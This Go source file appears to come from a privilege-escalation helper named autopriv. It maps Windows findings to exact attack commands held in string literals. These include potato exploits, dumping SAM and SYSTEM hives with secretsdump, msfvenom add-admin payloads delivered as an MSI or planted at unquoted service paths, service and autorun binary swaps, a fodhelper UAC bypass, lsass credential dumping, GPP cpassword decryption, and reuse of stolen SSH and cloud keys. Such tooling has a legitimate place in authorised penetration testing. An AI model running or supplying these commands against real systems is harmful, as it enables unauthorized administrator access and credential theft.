package autopriv

import "strings"

// ================================================================
// FASE 2 — Windows enumeration: findings → manual vectors
//
// Every Windows vector is MANUAL in v1.9 (Exploit == nil): the exploit
// engine prints the exact command and never pretends to run it, the same
// contract the Linux manual vectors follow. The commands are the ones an
// operator would actually type — payload generation where the technique
// needs one, registry reads where the vector is pure credential reuse.
// ================================================================

// enumerateWinFinding routes one WIN* finding to its technique vectors.
// Called from the shared enumerateAll/enumerateVectors switch, so the
// routing table stays OS-agnostic.
func enumerateWinFinding(p *AutoPrivilege, f Finding) {
	switch f.Source {
	case "WINPRIV":
		enumerateWinPriv(p, f)
	case "WINREG":
		enumerateWinRegistry(p, f)
	case "WINSVC":
		enumerateWinService(p, f)
	case "WINAUTO":
		enumerateWinAutorun(p, f)
	case "WINTASK":
		enumerateWinTask(p, f)
	case "WINCRED":
		enumerateWinCred(p, f)
	case "WINPATH":
		enumerateWinPath(p, f)
	}
}

// enumerateWinPriv turns a token privilege into its concrete abuse
// primitive, keyed by the privilege name the scanner reported.
func enumerateWinPriv(p *AutoPrivilege, f Finding) {
	switch {
	case strings.Contains(f.Target, "SeImpersonatePrivilege"):
		addManualVector(p, "SeImpersonate potato", "winpriv", f.Target,
			`PrintSpoofer64.exe -i -c "cmd /c whoami"   (or GodPotato / JuicyPotatoNG — pick by patch level)`,
			RiskDanger, nil)
	case strings.Contains(f.Target, "SeAssignPrimaryTokenPrivilege"):
		addManualVector(p, "SeAssignPrimaryToken abuse", "winpriv", f.Target,
			"Assign a SYSTEM primary token to a spawned process (potato-family companion primitive)",
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeBackupPrivilege"):
		addManualVector(p, "SeBackup hash dump", "winpriv", f.Target,
			`reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive && secretsdump.py -sam sam.hive -system system.hive LOCAL`,
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeRestorePrivilege"):
		addManualVector(p, "SeRestore overwrite", "winpriv", f.Target,
			"Write any file bypassing ACLs — overwrite utilman.exe/sethc.exe, then trigger it at the logon screen",
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeLoadDriverPrivilege"):
		addManualVector(p, "SeLoadDriver exploit", "winpriv", f.Target,
			"Load a kernel driver (Capcom.sys-style PoC) and execute ring-0 code",
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeTakeOwnershipPrivilege"):
		addManualVector(p, "SeTakeOwnership takeover", "winpriv", f.Target,
			"takeown /f <target> && icacls <target> /grant <user>:F — own any object, then read or replace it",
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeDebugPrivilege"):
		addManualVector(p, "SeDebug process access", "winpriv", f.Target,
			"Open any process (SYSTEM/lsass included) and dump credentials (comsvcs MiniDump / mimikatz)",
			RiskHigh, nil)
	case strings.Contains(f.Target, "SeCreateTokenPrivilege"):
		addManualVector(p, "SeCreateToken mint", "winpriv", f.Target,
			"Mint an elevated token with NtCreateToken and spawn a process under it",
			RiskDanger, nil)
	case strings.Contains(f.Target, "SeTcbPrivilege"):
		addManualVector(p, "SeTcb SYSTEM shell", "winpriv", f.Target,
			"Act as part of the trusted computing base — SYSTEM-equivalent process creation",
			RiskDanger, nil)
	case strings.Contains(f.Target, "SeManageVolumePrivilege"):
		addManualVector(p, "SeManageVolume abuse", "winpriv", f.Target,
			"Volume privilege primitives (Sticky's Hole / volume metadata abuse) to reach elevated code",
			RiskMedium, nil)
	case strings.Contains(f.Target, "UAC"):
		addManualVector(p, "UAC bypass (auto-elevate)", "winpriv", f.Target,
			`HKCU\Software\Classes\ms-settings\Shell\Open\command +DelegateExecute trick → fodhelper.exe   (or computerdefaults.exe / sdclt.exe)`,
			RiskMedium, nil)
	}
}

// enumerateWinRegistry: the two registry-borne escalation classics.
func enumerateWinRegistry(p *AutoPrivilege, f Finding) {
	switch {
	case strings.Contains(f.Target, "AlwaysInstallElevated"):
		addManualVector(p, "AlwaysInstallElevated msi", "winreg", f.Target,
			`msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi -o shell.msi && msiexec /quiet /qn /i shell.msi`,
			RiskHigh, nil)
	case strings.Contains(f.Target, "DefaultPassword"):
		addManualVector(p, "AutoLogon credential reuse", "winreg", f.Target,
			`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword   → runas /user:<DefaultUserName>`,
			RiskDanger, nil)
	}
}

// enumerateWinService: binary planting in its three Windows flavors.
func enumerateWinService(p *AutoPrivilege, f Finding) {
	switch {
	case strings.Contains(f.Description, "Unquoted"):
		addManualVector(p, "unquoted service path planting", "winservice", f.Target,
			`msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f exe -o "<writable ancestor>\Program.exe"   (name it after the first space prefix, then restart the service)`,
			RiskHigh, nil)
	case strings.Contains(f.Description, "user-writable directory"):
		addManualVector(p, "service binary replacement", "winservice", f.Target,
			`sc stop <service> && copy /y payload.exe "<service binary>" && sc start <service>   (payload = msfvenom add-admin)`,
			RiskHigh, nil)
	case strings.Contains(f.Description, "user profile"):
		addManualVector(p, "SYSTEM service binary swap", "winservice", f.Target,
			`Replace the binary under the user profile (msfvenom add-admin payload); it restarts as SYSTEM`,
			RiskHigh, nil)
	}
}

// enumerateWinAutorun: payload rides the logon execution.
func enumerateWinAutorun(p *AutoPrivilege, f Finding) {
	addManualVector(p, "autorun payload", "winauto", f.Target,
		`Replace/append the autorun binary (msfvenom add-admin payload) — it executes at the next logon, admins included`,
		RiskHigh, nil)
}

// enumerateWinTask: the scheduled-task script is the payload.
func enumerateWinTask(p *AutoPrivilege, f Finding) {
	addManualVector(p, "scheduled task payload", "wintask", f.Target,
		`Edit the task's script or replace its binary (msfvenom add-admin payload); it re-runs on schedule`,
		RiskHigh, nil)
}

// enumerateWinCred: extraction per artifact type.
func enumerateWinCred(p *AutoPrivilege, f Finding) {
	switch {
	case strings.Contains(f.Description, "answer file"):
		addManualVector(p, "unattend password extraction", "wincred", f.Target,
			`Parse the answer file: <PlainText>true</PlainText> is literal; otherwise the value is often decodable base64`,
			RiskDanger, nil)
	case strings.Contains(f.Description, "cpassword"):
		addManualVector(p, "GPP cpassword decrypt", "wincred", f.Target,
			`gpp-decrypt <cpassword>   (Kali ships it; the AES-256 key has been public since MS14-025)`,
			RiskDanger, nil)
	case strings.Contains(f.Target, "ConsoleHost_history"):
		addManualVector(p, "history review", "wincred", f.Target,
			`Read ConsoleHost_history.txt — operators type secrets into consoles more often than they think`,
			RiskMedium, nil)
	case strings.Contains(f.Target, "id_rsa"):
		addManualVector(p, "SSH key reuse", "wincred", f.Target,
			`ssh -i id_rsa <user>@<host>   (try the key against every host the user touches)`,
			RiskMedium, nil)
	case strings.Contains(f.Target, ".aws"), strings.Contains(f.Target, ".azure"):
		addManualVector(p, "cloud credential reuse", "wincred", f.Target,
			`Read the profile/credentials file and reuse the keys (aws sts get-caller-identity to validate first)`,
			RiskMedium, nil)
	}
}

// enumerateWinPath: the hijack itself.
func enumerateWinPath(p *AutoPrivilege, f Finding) {
	addManualVector(p, "PATH hijack", "winpath", f.Target,
		`Plant a binary/DLL named after what a privileged process resolves from this dir (procmon shows the miss)`,
		RiskHigh, nil)
}
